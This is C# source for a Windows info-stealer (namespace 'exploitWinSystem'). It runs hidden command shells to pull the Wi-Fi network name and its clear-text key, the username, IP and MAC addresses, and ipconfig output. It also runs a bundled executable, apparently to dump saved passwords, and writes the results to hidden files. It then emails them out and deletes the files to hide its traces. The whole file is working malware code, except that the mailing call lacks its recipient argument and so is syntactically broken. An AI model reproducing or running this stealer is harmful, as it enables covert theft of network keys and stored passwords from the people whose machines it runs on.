using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace exploitWinSystem
{
    class Program
    {
        static void Main(string[] args)
        {
            //.........................................................................INITIALIZE.............................................

            string errorOutput = "";
            string data = "No data!";

            string wifiName = "";
            string wifiPassword = "";
            string whoami = "";
            string extIPadress = "";
            string intIPadress = "";
            string ipConfig = "";
            string description = "";
            string MACadress = "";

            List<string> macData = new List<string>();
            List<string> WIFIadapterData = new List<string>();

            //.....................................................COLLECT DATA...............................................................

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo myProcessInfo = new System.Diagnostics.ProcessStartInfo();
            myProcessInfo.FileName = Environment.ExpandEnvironmentVariables("%SystemRoot%") + @"\System32\cmd.exe";
            myProcessInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            myProcessInfo.RedirectStandardOutput = true;
            myProcessInfo.UseShellExecute = false;
            myProcessInfo.CreateNoWindow = true;

            try
            {
                // start cmd

                myProcessInfo.Arguments = "/c NETSH WLAN SHOW INTERFACE | findstr /r \u0022^....SSID\u0022";
                process.StartInfo = myProcessInfo;
                process.Start();

                try
                {
                    // get wifi name

                    wifiName = process.StandardOutput.ReadToEnd();
                    wifiName = wifiName.Replace("\r\n", "").Replace(" ", "").Replace(":", "").Replace("SSID", "");
                }
                catch
                {
                    errorOutput += "- Couldnt get wifi name!\n";
                }

                try
                {
                    // get wifi key

                    myProcessInfo.Arguments = "/c NETSH WLAN SHOW PROFILE " + wifiName + " key=clear | findstr /r /c:\u0022^....Schlüsselinhalt\u0022 /c:\u0022^....Key Content\u0022";
                    process.StartInfo = myProcessInfo;
                    process.Start();
                    wifiPassword = process.StandardOutput.ReadToEnd();
                    wifiPassword = wifiPassword.Replace("\r\n", "").Replace(" ", "").Replace(":", "").Replace("Schl\u0081sselinhalt", "").Replace("KeyContent", "");
                }
                catch
                {
                    errorOutput += "- Couldnt get wifi key!\n";
                }

                try
                {
                    // get extIP address

                    myProcessInfo.Arguments = "/c nslookup myip.opendns.com. resolver1.opendns.com";
                    process.StartInfo = myProcessInfo;
                    process.Start();
                    extIPadress = process.StandardOutput.ReadToEnd();
                    string[] splitIP = extIPadress.Split(new Char[] { ':' });
                    extIPadress = splitIP[4].Replace("\r\n", "").Remove(0, 2);
                }
                catch
                {
                    errorOutput += "- Couldnt get extIPadress!\n";
                }

                try
                {
                    // get pc username

                    myProcessInfo.Arguments = "/c whoami";
                    process.StartInfo = myProcessInfo;
                    process.Start();
                    whoami = process.StandardOutput.ReadToEnd();
                    string[] splitUsername = whoami.Split(new Char[] { '\\' });
                    whoami = splitUsername[1].Replace("\r\n", "");
                }
                catch
                {
                    errorOutput += "- Couldnt get pc username!\n";
                }

                try
                {
                    // get ipconfig

                    myProcessInfo.Arguments = "/c ipconfig /all";
                    process.StartInfo = myProcessInfo;
                    process.Start();
                    ipConfig = process.StandardOutput.ReadToEnd();

                    //......................................................ATTACHMENT 1 - ipconfig..............................................................................

                    using (StreamWriter writer =
                    new StreamWriter("-ipconfig.txt"))
                    {
                        writer.Write(ipConfig);
                        writer.Close();
                        writer.Dispose();
                    }

                    FileInfo FI = new FileInfo(Directory.GetCurrentDirectory() + "/-ipconfig.txt");
                    FI.Attributes = FileAttributes.Hidden;
                }
                catch
                {
                    errorOutput += "- Couldnt get ip config!\n";
                }

                try
                {
                    // get data from ipconfig

                    intIPadress = "";

                    string line;

                    using (StreamReader file = new StreamReader(Directory.GetCurrentDirectory() + "/-ipconfig.txt"))
                    {
                        int counter = 1;

                        while ((line = file.ReadLine()) != null)
                        {
                            // get intIP address

                            if (line.Contains("IPv4-Adresse") | line.Contains("IPv4 Address"))
                            {
                                string[] splitIntIP = line.Split(new Char[] { ':' });
                                string[] splitIntIP2 = splitIntIP[1].Split(new Char[] { '(' });
                                intIPadress = splitIntIP2[0].Replace("\r\n", "").Remove(0, 1);
                            }

                            // get WIFI adapters

                            if (line.Contains("Beschreibung") | line.Contains("Description"))
                            {
                                string[] splitDescription = line.Split(new Char[] { ':' });
                                description = splitDescription[1].Replace("\r\n", "").Remove(0, 1);
                                WIFIadapterData.Add(counter + ". " + description);
                            }

                            // get MAC adresses

                            if (line.Contains("Physische Adresse") | line.Contains("Physical Address"))
                            {
                                string[] splitMAC = line.Split(new Char[] { ':' });
                                MACadress = splitMAC[1].Replace("\r\n", "").Remove(0, 1);
                                macData.Add(counter + ". " + MACadress);

                                counter++;
                            }
                        }

                        file.Close();
                        file.Dispose();
                    }
                }
                catch
                {
                    errorOutput += "- Couldnt read ip config data!\n";
                }

                //......................................................ATTACHMENT 2 - data.................................................................   

                data = "User: " + whoami + "\nWLAN name: " + wifiName + "\nWLAN password: " + wifiPassword + "\nextIPadress: " + extIPadress + "\nintIPadress: " + intIPadress + "\n\nWLANadapters:\n";

                foreach (string s in WIFIadapterData)
                    data += "\n" + s;

                data += "\n\nMACadresses:\n";

                foreach (string s in macData)
                    data += "\n" + s;

                if (errorOutput == "")
                    errorOutput = "No errors!";

                data += "\n\nERRORS:\n\n" + errorOutput;
            }
            catch
            {
                errorOutput += "- Couldnt load CMD!\n";
            }   

            // create data file

            using (StreamWriter writer =
            new StreamWriter("-data.txt"))
            {
                writer.Write(data);
                writer.Close();
                writer.Dispose();
            }

            FileInfo FI2 = new FileInfo(Directory.GetCurrentDirectory() + "/-data.txt");
            FI2.Attributes = FileAttributes.Hidden;

            //......................................................ATTACHMENT 3 - passwords..................................................................

            try
            {
                myProcessInfo.Arguments = "/c " + Directory.GetCurrentDirectory() + "/Windows_Data.exe all -v";
                process.StartInfo = myProcessInfo;
                process.Start();
                string passwords = process.StandardOutput.ReadToEnd();

                using (StreamWriter writer =
                new StreamWriter("-passwords.txt"))
                {
                    writer.Write(passwords);
                    writer.Close();
                    writer.Dispose();
                }

                var lines = File.ReadAllLines(Directory.GetCurrentDirectory() + "/-passwords.txt");
                File.WriteAllLines(Directory.GetCurrentDirectory() + "/-passwords.txt", lines.Skip(9).ToArray());

                FileInfo FI3 = new FileInfo(Directory.GetCurrentDirectory() + "/-passwords.txt");
                FI3.Attributes = FileAttributes.Hidden;
            }
            catch
            {
                errorOutput += "Couldnt fetch passwords!\n";
            }

            //........................................................SEND DATA........................................................................

            Email.deliverPackage(, Directory.GetCurrentDirectory() + "/-data.txt", Directory.GetCurrentDirectory() + "/-ipconfig.txt", Directory.GetCurrentDirectory() + "/-passwords.txt",  whoami);

            //........................................................CLEAN UP........................................................................

            if (File.Exists(Directory.GetCurrentDirectory() + "/-data.txt"))
                File.Delete(Directory.GetCurrentDirectory() + "/-data.txt");

            if (File.Exists(Directory.GetCurrentDirectory() + "/-ipconfig.txt"))
                File.Delete(Directory.GetCurrentDirectory() + "/-ipconfig.txt");

            if (File.Exists(Directory.GetCurrentDirectory() + "/-passwords.txt"))
                File.Delete(Directory.GetCurrentDirectory() + "/-passwords.txt");
        }
    }
} // git clone? hide?..................
